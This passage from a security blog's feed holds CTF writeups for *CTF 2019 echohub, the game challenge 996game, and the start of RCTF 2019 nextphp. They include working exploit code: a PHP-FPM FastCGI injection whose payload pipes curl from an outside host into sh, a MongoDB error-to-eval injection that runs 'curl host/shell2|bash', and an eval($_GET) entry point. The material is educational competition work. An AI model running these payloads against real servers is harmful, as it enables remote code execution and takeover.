class="title">hexToStr</span><span class="params">($hex)</span> </span>&#123;</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($hex) - <span class="number">1</span>; $i += <span class="number">2</span>) &#123;</span><br><span class="line">$str .= chr(hexdec($hex[$i] . $hex[$i + <span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_httpPost</span><span class="params">($url = <span class="string">""</span>, $requestData = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">$curl = curl_init();</span><br><span class="line"><span class="comment">#curl_setopt( $curl, CURLOPT_PROXY, "127.0.0.1:8080" );</span></span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ™®é€šæ•°æ®</span></span><br><span class="line">curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($requestData));</span><br><span class="line">$res = curl_exec($curl);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$info = curl_getinfo($ch);</span></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phpinfo_addr = array_search(<span class="string">'phpinfo'</span>, $plt);</span><br><span class="line">$gets = <span class="string">'zeroyu'</span>;</span><br><span class="line">$main_stack1 = <span class="keyword">new</span> stack($phpinfo_addr, $gets);</span><br><span class="line">$ebp = $main_stack1-&gt;ebp;</span><br><span class="line">$esp = $main_stack1-&gt;esp;</span><br><span class="line">$padding_num = ($main_stack1-&gt;ebp - $main_stack1-&gt;esp) - <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">$shellcode = <span class="string">'&#125;echo "pwned&lt;br&gt;";$fp = stream_socket_client("unix:///run/php/php7.3-fpm.sock", $errno, $errstr,30);$out = urldecode("%01%01%99%E6%00%08%00%00%00%01%00%00%00%00%00%00%01%04%99%E6%01%DB%00%00%0E%02CONTENT_LENGTH73%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%99%E6%00%00%00%00%01%05%99%E6%00I%00%00%3C%3Fphp%20system%28%27curl%20http%3A//ebcece08.w1n.pw/getflag%20%7C%20sh%27%29%3Bdie%28%27zeroyu%27%29%3B%3F%3E%01%05%99%E6%00%00%00%00");stream_socket_sendto($fp,$out);while (!feof($fp)) &#123;echo htmlspecialchars(fgets($fp, 10)); &#125;fclose($fp);//'</span>;</span><br><span class="line"></span><br><span class="line">$post_data = <span class="keyword">array</span>();</span><br><span class="line">$data = str_repeat(<span class="string">'A'</span>, $padding_num) . hexToStr(strrev($canarycheck)) . <span class="string">"BBBB"</span> . hexToStr(strrev(dechex($func_[<span class="string">'create_function'</span>]))) . <span class="string">'000266667777'</span>;</span><br><span class="line">$post_data[<span class="string">'data'</span>] = $data;</span><br><span class="line">$post_data[$func_[<span class="string">'create_function'</span>]] = <span class="string">'zeroyu'</span>;</span><br><span class="line">$post_data[<span class="string">'6666'</span>] = <span class="string">''</span>;</span><br><span class="line">$post_data[<span class="string">'7777'</span>] = $shellcode;</span><br><span class="line"></span><br><span class="line">$rs = _httpPost(<span class="string">"http://47.90.204.28:10080/"</span>, $post_data);</span><br><span class="line"><span class="keyword">echo</span> $rs;</span><br></pre></td></tr></table></figure><p>rrçš„exp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=stream_socket_client(<span class="string">"unix:///run/php/php7.3-fpm.sock"</span>);</span><br><span class="line">fputs($a, urldecode(<span class="string">"%01%01R%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04R%01%01%DC%00%00%0E%03CONTENT_LENGTH697%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04R%01%00%00%00%00%01%05R%01%02%B9%00%00%3C%3Fphp%0A%24descriptorspec%20%3D%20array%28%0A%20%20%200%20%3D%3E%20array%28%22pipe%22%2C%20%22r%22%29%2C%0A%20%20%201%20%3D%3E%20array%28%22pipe%22%2C%20%22w%22%29%2C%0A%20%20%202%20%3D%3E%20array%28%22pipe%22%2C%20%22w%22%29%0A%29%3B%0A%0A%24cwd%20%3D%20%27/%27%3B%0A%24env%20%3D%20array%28%29%3B%0A%0A%24process%20%3D%20proc_open%28%27/readflag%27%2C%20%24descriptorspec%2C%20%24pipes%2C%20%24cwd%2C%20%24env%29%3B%0A%0Aif%20%28is_resource%28%24process%29%29%20%7B%0A%20%20%20%20%24a%20%3D%20fread%28%24pipes%5B1%5D%2C%201024%29%3B%0A%20%20%20%20%24a%20%3D%20fread%28%24pipes%5B1%5D%2C%201024%29%3B%0A%0A%20%20%20%20%24a%20%3D%20explode%28%22%5Cn%22%2C%20%24a%29%3B%0A%20%20%20%20eval%28%22%5C%24result%20%3D%20%24a%5B0%5D%3B%22%29%3B%0A%20%20%20%20echo%28%22%5C%24result%20%3D%20%24a%5B0%5D%3B%22%29%3B%0A%0A%20%20%20%20fwrite%28%24pipes%5B0%5D%2C%20%22%24result%5Cn%22%29%3B%0A%0A%20%20%20%20var_dump%28fread%28%24pipes%5B1%5D%2C%201024%29%29%3B%0A%20%20%20%20var_dump%28fread%28%24pipes%5B1%5D%2C%201024%29%29%3B%0A%20%20%20%20var_dump%28fread%28%24pipes%5B1%5D%2C%201024%29%29%3B%0A%0A%20%20%20%20fclose%28%24pipes%5B0%5D%29%3B%0A%20%20%20%20fclose%28%24pipes%5B1%5D%29%3B%0A%20%20%20%20%24return_value%20%3D%20proc_close%28%24process%29%3B%0A%0A%20%20%20%20echo%20%22command%20returned%20%24return_value%5Cn%22%3B%0A%7D%0A%3F%3E%01%05R%01%00%00%00%00"</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br></pre></td></tr></table></figure></p><h4 id="6-å‚è€ƒ"><a href="#6-å‚è€ƒ" class="headerlink" title="6.å‚è€ƒ"></a>6.å‚è€ƒ</h4><p><a href="https://github.com/sixstars/starctf2019/blob/7e8bd4efbef03ed2b6a6bea2a01befc6374dde9e/web-echohub/readme.md" target="_blank" rel="noopener">ã€ŠEchohub å®˜æ–¹ã€‹</a></p><p><a href="https://xz.aliyun.com/t/5006#toc-3" target="_blank" rel="noopener">ã€ŠROIS *CTF2019 Writeupã€‹</a></p><p><a href="https://www.secpulse.com/archives/105333.html" target="_blank" rel="noopener">ã€ŠCTF 2019 Mywebsql Echohub WriteUpã€‹</a></p><p><a href="https://evoa.me/index.php/archives/52/" target="_blank" rel="noopener">ã€ŠPHP è¿æ¥æ–¹å¼&amp;æ”»å‡»PHP-FPM&amp;*CTF echohub WPã€‹</a></p><p><a href="https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">ã€Š2019æ˜ŸCTFä¹‹Webéƒ¨åˆ†é¢˜è§£ã€‹</a></p><h3 id="3-996game"><a href="#3-996game" class="headerlink" title="3. 996game"></a>3. 996game</h3><h4 id="OrZ"><a href="#OrZ" class="headerlink" title="OrZ"></a>OrZ</h4><p>This challenge is temporarily made in the afternoon before the CTF game(From findding bugs to challenges). So there are some rushes in this challenge , please bear with me.</p><h4 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h4><p>First we can find hint from HTML source code.</p><p><img src="https://i.imgur.com/yCKELtI.png" alt></p><p>Itâ€™s an open-source HTML5 game. </p><p><a href="https://github.com/Jerenaux/phaserquest" target="_blank" rel="noopener">https://github.com/Jerenaux/phaserquest</a></p><p>We can see there is a static file leak vulnerability</p><p><a href="https://github.com/Jerenaux/phaserquest/blob/master/server.js#L44" target="_blank" rel="noopener">https://github.com/Jerenaux/phaserquest/blob/master/server.js#L44</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">'/css'</span>,express.static(__dirname + <span class="string">'/css'</span>));</span><br><span class="line">app.use(<span class="string">'/js'</span>,express.static(__dirname + <span class="string">'/js'</span>));</span><br><span class="line">app.use(<span class="string">'/assets'</span>,express.static(__dirname + <span class="string">'/assets'</span>));</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå™¨å‡½æ•°express.staticä¼šç”Ÿæˆä¸€ä¸ªä¸­é—´ä»¶å‡½æ•°ã€‚è¯¥ä¸­é—´ä»¶å“åº”è¯·æ±‚çš„æ–¹æ³•ï¼Œæ˜¯å°†ä¼ é€’ç»™ç”Ÿæˆå™¨å‡½æ•°çš„å‚æ•°è§†ä½œä¸€ä¸ªç›®å½•ï¼Œå¹¶å°è¯•åœ¨å…¶ä¸­å¯»æ‰¾èƒ½ä¸è¯·æ±‚URLç›¸åŒ¹é…çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶è·¯å¾„å­˜åœ¨ï¼Œå°±å°†æ–‡ä»¶çš„å†…å®¹ä½œä¸ºå“åº”è¿”å›ï¼›å¦‚æœä¸å­˜åœ¨ï¼Œå°±æ‰§è¡Œä¸­é—´ä»¶é“¾æ¡ä¸Šçš„ä¸‹ä¸€ä¸ªå‡½æ•°ã€‚ä¸­é—´ä»¶æ˜¯é€šè¿‡åº”ç”¨çš„use()æ–¹æ³•æŒ‚åœ¨åˆ°åº”ç”¨ä¸Šçš„ã€‚</p><p>å¯¹æ¯”æºä»£ç å¯ä»¥è¿…é€Ÿå‘ç°ä¸€ä¸ªevalå‡½æ•°</p><p><img src="https://i.loli.net/2019/09/15/dLNRmZKgFBSw4p1.png" alt="5C91C1D6-DA0C-4A0C-A5EF-ADCD922BBC3F.png"></p><p><img src="https://i.imgur.com/2isT1nn.png" alt></p><p>è¿™é‡Œå½“æŸ¥è¯¢ mongodb æŠ¥é”™æ—¶ï¼Œä¼šæŠŠæŠ¥é”™ä¿¡æ¯ err.message å¸¦å…¥ eval ä¸­ï¼Œæ‰€ä»¥åªè¦æŠ¥é”™ä¿¡æ¯å¯æ§å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>Now, we need to find a way to get mongodb error.</p><p>æ­¤å¤„æˆ‘ä»¬ç›´æ¥è¿›dockerä¸­çœ‹ä¸€ä¸‹mongoçš„é”™è¯¯ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it source_mongo_1 /bin/bash</span><br></pre></td></tr></table></figure><p>è¿›å…¥mongoçš„shellæŸ¥è¯¢ä¸€ä¸‹å¯¹è±¡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt; show dbs</span><br><span class="line">admin        0.000GB</span><br><span class="line">local        0.000GB</span><br><span class="line">phaserQuest  0.000GB</span><br><span class="line">&gt; use phaserQuest</span><br><span class="line">switched to db phaserQuest</span><br><span class="line">&gt; db</span><br><span class="line">phaserQuest</span><br><span class="line">&gt; show tables</span><br><span class="line">players</span><br><span class="line">&gt; db.playsers.find(&#123;_id:&#123;&apos;$a=1;&apos;:&quot;&quot;&#125;&#125;)</span><br><span class="line">Error: error: &#123;</span><br><span class="line">&quot;ok&quot; : 0,</span><br><span class="line">&quot;errmsg&quot; : &quot;unknown operator: $a=1;&quot;,</span><br><span class="line">&quot;code&quot; : 2,</span><br><span class="line">&quot;codeName&quot; : &quot;BadValue&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°æŸ¥è¡¨æ—¶å½“æ¡ä»¶æ˜¯ä¸€ä¸ª JSON ä¸”é”®åä»¥$å¼€å¤´æ—¶ mongodb å°±ä¼šæŠ¥é”™ï¼Œè¿˜ä¼šæŠŠé”®åè¾“å‡ºåˆ° errmsg ä¸­ã€‚ä½†æ˜¯æ­¤å¤„ id è¿˜ç»è¿‡äº† new ObjectId() å¯¹è±¡ï¼Œå› æ­¤</p><p>Only one thing we can control is id, so we can track the <code>ObjectId()</code> function.</p><p><a href="https://github.com/mongodb/js-bson/blob/V1.0.4/lib/bson/objectid.js#L28" target="_blank" rel="noopener">https://github.com/mongodb/js-bson/blob/V1.0.4/lib/bson/objectid.js#L28</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> valid = ObjectID.isValid(id);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">ObjectID.isValid = <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(id == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> id == <span class="string">'number'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> id == <span class="string">'string'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> id.length == <span class="number">12</span> || (id.length == <span class="number">24</span> &amp;&amp; checkForHexRegExp.test(id));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(id <span class="keyword">instanceof</span> ObjectID) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(id <span class="keyword">instanceof</span> _Buffer) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Duck-Typing detection of ObjectId like objects</span></span><br><span class="line">  <span class="keyword">if</span>(id.toHexString) &#123;</span><br><span class="line">    <span class="keyword">return</span> id.id.length == <span class="number">12</span> || (id.id.length == <span class="number">24</span> &amp;&amp; checkForHexRegExp.test(id.id));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Now we can use <code>id = {&quot;id&quot;:{&quot;length&quot;:12}}</code> bypass it.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!valid &amp;&amp; id != <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Argument passed in must be a single String of 12 bytes or a string of 24 hex characters"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(valid &amp;&amp; <span class="keyword">typeof</span> id == <span class="string">'string'</span> &amp;&amp; id.length == <span class="number">24</span> &amp;&amp; hasBufferType) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ObjectID(<span class="keyword">new</span> Buffer(id, <span class="string">'hex'</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(valid &amp;&amp; <span class="keyword">typeof</span> id == <span class="string">'string'</span> &amp;&amp; id.length == <span class="number">24</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectID.createFromHexString(id);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(id != <span class="literal">null</span> &amp;&amp; id.length === <span class="number">12</span>) &#123;</span><br><span class="line">    <span class="comment">// assume 12 byte string</span></span><br><span class="line">    <span class="keyword">this</span>.id = id;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(id != <span class="literal">null</span> &amp;&amp; id.toHexString) &#123;</span><br><span class="line">    <span class="comment">// Duck-typing to support ObjectId from different npm packages</span></span><br><span class="line">    <span class="keyword">return</span> id;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Argument passed in must be a single String of 12 bytes or a string of 24 hex characters"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Now , we change our payload to<br><code>id = {&quot;length&quot;:0,&quot;toHexString&quot;:true,&quot;id&quot;:{&quot;length&quot;:12}},</code></p><p>And then the whole payload will be sent to mongodb server.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MongoDB shell version: <span class="number">2.6</span><span class="number">.10</span></span><br><span class="line">connecting to: test</span><br><span class="line">&gt; db.a.find(&#123;<span class="string">"b"</span>:&#123;<span class="string">"$gt"</span>:<span class="number">1</span>,<span class="string">"c"</span>:<span class="string">"d"</span>&#125;&#125;)</span><br><span class="line">error: &#123;</span><br><span class="line"><span class="string">"$err"</span> : <span class="string">"Can't canonicalize query: BadValue unknown operator: c"</span>,</span><br><span class="line"><span class="string">"code"</span> : <span class="number">17287</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So the whole exploit is</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client.socket.emit(<span class="string">'init-world'</span>,&#123;<span class="attr">new</span>:<span class="literal">false</span>,<span class="attr">id</span>:&#123;<span class="string">"$in"</span>:[<span class="number">1</span>],<span class="string">"require('child_process').exec('/usr/bin/curl host/shell2|bash')"</span>:<span class="string">"bbb"</span>,<span class="string">"length"</span>:<span class="number">0</span>,<span class="string">"toHexString"</span>:<span class="literal">true</span>,<span class="string">"id"</span>:&#123;<span class="string">"length"</span>:<span class="number">12</span>&#125;&#125;,<span class="attr">clientTime</span>:<span class="string">"sacsaccsacsac"</span>&#125;);</span><br></pre></td></tr></table></figure><p>RRçš„exp</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client.getPlayerID = <span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="keyword">return</span> &#123;<span class="string">'$a=1;require(`child_process`).exec(`command`);'</span>: <span class="string">""</span>, <span class="attr">toHexString</span>: <span class="number">1</span>, <span class="attr">id</span>: &#123;<span class="attr">length</span>: <span class="number">12</span>&#125;&#125;&#125;</span><br><span class="line">Client.requestData()</span><br></pre></td></tr></table></figure><p>æ­¤å¤„å¯¹nodeè¿˜æ˜¯ä¸ç†Ÿæ‚‰ï¼Œåé¢åº”è¯¥åŠ å¼ºï¼Œå›å»çœ‹nodeå’Œmongoäº†</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™æ¬¡çš„é¢˜ç›®çœŸçš„è®©æˆ‘å­¦äº†å¥½ä¹…ï¼Œå“ˆå“ˆ&lt;/p&gt;
&lt;p&gt;ç¯å¢ƒéƒ¨ç½²ï¼š&lt;br&gt;&lt;figure class=&quot;hi
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019 rctf writeup</title>
    <link href="http://zer0yu.github.io/2019/09/14/2019-rctf-writeup/"/>
    <id>http://zer0yu.github.io/2019/09/14/2019-rctf-writeup/</id>
    <published>2019-09-14T15:48:30.000Z</published>
    <updated>2019-09-14T16:06:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å­¦åˆ°äº†å¥½å¤š</p><h2 id="0x01-nextphp"><a href="#0x01-nextphp" class="headerlink" title="0x01 nextphp"></a>0x01 nextphp</h2><ol><li>è§£é¢˜æ€è·¯</li></ol><p>æ ¹æ®æ ‡é¢˜nextphpå’Œphpçš„ç‰ˆæœ¬ä¸ºphp7.4ï¼Œä»è€Œåˆ¤æ–­å‡ºç›®æ ‡æ˜¯åˆ©ç”¨äº†php7.4çš„æŸç§æ–°ç‰¹æ€§</p><ol start="2"><li>è§£é¢˜è¿‡ç¨‹</li></ol><p>é¦–å…ˆè¿›è¡Œä¿¡æ¯æœé›†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æŸ¥çœ‹phpinfoå‘ç°è¢«disableäº†æ‰€æœ‰å·²çŸ¥å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯å‘ç°åœ¨ç¼–è¯‘PHPæ—¶å¼€å¯äº†ffiå¹¶ä¸”ffiæ˜¯enableçš„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;./configure&apos; &apos;--build=x86_64-linux-gnu&apos; &apos;--with-config-file-path=/usr/local/etc/php&apos; &apos;--with-config-file-scan-dir=/usr/local/etc/php/conf.d&apos; &apos;--with-ffi&apos; &apos;--enable-option-checking=fatal&apos; &apos;--with-mhash&apos; &apos;--enable-ftp&apos; &apos;--enable-mbstring&apos; &apos;--enable-mysqlnd&apos; &apos;--with-password-argon2&apos; &apos;--with-sodium&apos; &apos;--with-curl&apos; &apos;--with-libedit&apos; &apos;--with-openssl&apos; &apos;--with-zlib&apos; &apos;--with-pear&apos; &apos;--with-libdir=lib/x86_64-linux-gnu&apos; &apos;--with-apxs2&apos; &apos;--disable-cgi&apos; &apos;build_alias=x86_64-linux-gnu&apos;</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯ä¸ºäº†å®‰å…¨php7.4ä¸­ffiä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥å€ŸåŠ©evalï¼Œä½†æ˜¯å‘ç°å½“å‰ç›®å½•å­˜åœ¨preload.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=var_dump(scandir(%27./%27));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; [3]=&gt; string(11) &quot;preload.php&quot; &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 